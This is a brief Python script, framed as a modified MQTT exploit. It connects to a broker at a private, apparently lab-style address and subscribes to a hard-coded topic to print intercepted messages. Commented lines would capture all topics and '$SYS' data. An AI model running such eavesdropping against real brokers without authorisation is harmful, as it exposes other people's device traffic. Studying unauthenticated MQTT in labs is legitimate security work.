#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "10.10.110.82"
PORT = 1883

def on_connect(client, userdata, flags, rc):
    # client.subscribe('#',qos=1)
    # client.subscribe('XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub', qos=1)
    client.subscribe('U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub', qos=1)
    # client.subscribe('$SYS/#')

def on_message(client, userdata, message):
    print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
    print("Starting...\n")
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(HOST, PORT)
    client.loop_forever()
    #time.sleep(10)
    #client.loop_stop()

if __name__ == "__main__":
    main()
